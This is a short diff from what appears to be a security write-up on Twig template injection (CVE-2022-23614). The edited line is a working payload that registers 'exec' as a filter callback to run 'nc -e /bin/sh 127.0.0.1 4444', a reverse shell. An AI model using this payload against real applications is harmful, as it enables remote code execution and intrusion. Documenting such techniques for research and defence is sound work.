@@ -9,5 +9,5 @@ To convert the newly initialized variables back to a string, the slice operator 
 The payload then works in the usual way which I won't go into since it's pretty well documented. For the curious, you can find more information [here](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md#twig-cve-2022-23614) among many other resources.
 
 ~~~
-{%set+c%}nc -e /bin/sh 127.0.0.1 4444{%endset%}{%set+e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|e[:])}}{{_self.env.getFilter(c|e[:])}}
+{%set c%}nc -e /bin/sh 127.0.0.1 4444{%endset%}{%set e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|e[:])}}{{_self.env.getFilter(c|e[:])}}
 ~~~
